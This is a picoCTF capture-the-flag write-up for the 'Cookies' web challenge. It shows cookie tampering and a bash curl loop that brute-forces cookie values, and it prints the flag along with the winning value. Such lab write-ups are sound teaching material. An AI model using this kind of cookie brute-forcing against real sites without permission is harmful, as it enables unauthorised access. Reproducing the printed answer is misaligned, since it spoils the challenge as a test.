# Cookies

![image.png](images/image.png)

After we reached the site, we will see a cookie search page

![image.png](images/image%201.png)

What if we enter `snickerdoodle`? We will pass the check, but then it will complain the cookie is not special enough

![image.png](images/image%202.png)

If we open up F12, we will see that the value is `0`. What if we set it to `1`?

![image.png](images/image%203.png)

![image.png](images/image%204.png)

To find the correct value, we can try to brute force it

```bash
#!/bin/bash

for i in {1..50};
do
    curl http://wily-courier.picoctf.net:xxxxx/check -b "name=$i"

done
```

We can get the flag after a few tries

```bash
└─$ ./test.sh |grep picoCTF{
.
.
.
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1774  100  1774    0     0   3784      0 --:--:-- --:--:-- --:--:--  3782
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1771  100  1771    0     0   3946      0 --:--:-- --:--:-- --:--:--  3953
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1185  100  1185    0     0   2742      0 --:--:-- --:--:-- --:--:--  2749
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1774  100  1774    0     0   4079      0 --:--:-- --:--:-- --:--:--  4078
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1773  100  1773    0     0   4152      0 --:--:-- --:--:-- --:--:--  4161
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1773  100  1773    0     0   4202      0 --:--:-- --:--:-- --:--:--  4201
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1772  100  1772    0     0   4121      0 --:--:-- --:--:-- --:--:--  4130
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0^C

```

We can also do it manually. And we will find the correct value to be `18`

![image.png](images/image%205.png)

Flag: `picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}`
